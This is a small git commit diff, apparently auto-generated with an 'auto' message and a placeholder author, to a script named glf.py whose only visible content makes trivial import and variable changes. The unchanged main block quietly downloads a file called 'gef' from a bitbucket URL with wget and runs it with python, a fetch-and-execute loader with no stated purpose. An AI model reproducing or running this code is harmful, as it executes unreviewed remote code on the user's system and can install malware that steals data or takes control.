cfc02dab8d8707f18e3290c048821c2b30fecccd
Your Name <you@example.com>
2024-10-30 07:20:32 +0100

    auto

--- glf.py
+++ glf.py
@@ -1,4 +1,4 @@
-import os, sys,functools
-r=15
+import os, sys,shutil
+n=24
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef';os.system(cmd)
